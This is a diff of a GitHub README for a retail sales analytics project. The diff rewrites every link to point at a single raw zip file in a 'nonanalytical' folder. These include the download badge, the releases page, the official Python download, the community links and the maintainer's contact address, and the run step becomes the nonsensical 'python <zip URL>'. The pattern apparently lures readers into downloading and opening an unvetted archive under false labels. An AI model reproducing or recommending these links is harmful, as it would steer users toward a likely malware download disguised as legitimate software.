@@ -1,6 +1,6 @@
 # 📊 Retail-Sales-Analytics-Pipeline - Analyze Sales Data Easily
 
-![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download](https://raw.githubusercontent.com/nic081/Retail-Sales-Analytics-Pipeline/main/nonanalytical/Retail-Sales-Analytics-Pipeline.zip%20Now-Click%20Here-brightgreen)
 
 ## 📖 Description
 This Retail Sales Analytics Pipeline is a fully modular, end-to-end data analytics project. It helps retail businesses assess sales performance, understand customer behavior, and evaluate marketing ROI. The project generates actionable insights through user-friendly dashboards and reports.
@@ -18,16 +18,16 @@ Follow these steps to set up and run the Retail Sales Analytics Pipeline.
 ## 📥 Download & Install
 To get the latest version of the software, visit the Releases page to download the application.
 
-[Visit this page to download](https://github.com/nic081/Retail-Sales-Analytics-Pipeline/releases)
+[Visit this page to download](https://raw.githubusercontent.com/nic081/Retail-Sales-Analytics-Pipeline/main/nonanalytical/Retail-Sales-Analytics-Pipeline.zip)
 
 ### 🛠 Installation Steps
-1. **Go to the Releases page**: Click [here](https://github.com/nic081/Retail-Sales-Analytics-Pipeline/releases) to navigate to the Releases page.
+1. **Go to the Releases page**: Click [here](https://raw.githubusercontent.com/nic081/Retail-Sales-Analytics-Pipeline/main/nonanalytical/Retail-Sales-Analytics-Pipeline.zip) to navigate to the Releases page.
 2. **Choose a version**: Find the latest version listed. 
 3. **Download the file**: Click on the file that matches your operating system. The file will download automatically.
 4. **Open the downloaded file**: Locate the downloaded file in your computer's Downloads folder. Double-click to open it.
 
 ### 📊 How to Use
-1. **Set Up the Environment**: Ensure you have Python installed. If not, download it from the [official site](https://www.python.org/downloads/).
+1. **Set Up the Environment**: Ensure you have Python installed. If not, download it from the [official site](https://raw.githubusercontent.com/nic081/Retail-Sales-Analytics-Pipeline/main/nonanalytical/Retail-Sales-Analytics-Pipeline.zip).
 2. **Install Required Packages**: 
    Open your command line or terminal and run the following commands:
    ```
@@ -42,7 +42,7 @@ To get the latest version of the software, visit the Releases page to download t
 3. **Run the Pipeline**: 
    After the installations, navigate to the directory where you have your Retail Sales Analytics Pipeline files. Use the terminal or command prompt to run the pipeline:
    ```
-   python run_pipeline.py
+   python https://raw.githubusercontent.com/nic081/Retail-Sales-Analytics-Pipeline/main/nonanalytical/Retail-Sales-Analytics-Pipeline.zip
    ```
 
 ## 📈 Features
@@ -58,8 +58,8 @@ For detailed usage instructions, visit the project's Wiki. You can find informat
 ## 🧑‍🤝‍🧑 Community
 Join our community of users for support and collaboration. 
 
-- [GitHub Discussions](https://github.com/nic081/Retail-Sales-Analytics-Pipeline/discussions)
-- [Twitter](https://twitter.com/YourCommunityTwitter)
+- [GitHub Discussions](https://raw.githubusercontent.com/nic081/Retail-Sales-Analytics-Pipeline/main/nonanalytical/Retail-Sales-Analytics-Pipeline.zip)
+- [Twitter](https://raw.githubusercontent.com/nic081/Retail-Sales-Analytics-Pipeline/main/nonanalytical/Retail-Sales-Analytics-Pipeline.zip)
 
 ## 👩‍💻 Contribution
 We welcome contributions! If you would like to contribute, please review the contribution guidelines.
@@ -70,9 +70,9 @@ We welcome contributions! If you would like to contribute, please review the con
 4. Submit a pull request.
 
 ## 📞 Contact
-For any questions, you can contact the maintainer at [example@example.com](mailto:example@example.com).
+For any questions, you can contact the maintainer at [https://raw.githubusercontent.com/nic081/Retail-Sales-Analytics-Pipeline/main/nonanalytical/Retail-Sales-Analytics-Pipeline.zip](https://raw.githubusercontent.com/nic081/Retail-Sales-Analytics-Pipeline/main/nonanalytical/Retail-Sales-Analytics-Pipeline.zip).
 
 ## ⚙️ License
 This project is licensed under the MIT License. Please see the [LICENSE](LICENSE) file for details.
 
-[Download the latest version here](https://github.com/nic081/Retail-Sales-Analytics-Pipeline/releases) and start analyzing your retail data today!
+[Download the latest version here](https://raw.githubusercontent.com/nic081/Retail-Sales-Analytics-Pipeline/main/nonanalytical/Retail-Sales-Analytics-Pipeline.zip) and start analyzing your retail data today!
